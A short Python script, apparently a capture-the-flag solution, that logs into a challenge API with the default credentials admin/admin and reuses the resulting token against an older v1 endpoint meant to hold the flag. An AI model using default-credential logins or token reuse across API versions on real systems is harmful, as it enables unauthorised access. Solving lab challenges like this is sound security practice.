import requests

url_login = "http://exp.cybergame.sk:7021/api/v2/login"
r_login = requests.post(url_login, json={"username": "admin", "password": "admin"}, headers={"Content-Type": "application/json"})
token = r_login.json().get("token")

# Let's check `api/v1/secretendpointforflag`
r = requests.get("http://exp.cybergame.sk:7021/api/v1/secretendpointforflag", headers={"Authorization": f"Bearer {token}"})
print("v1:", r.text)
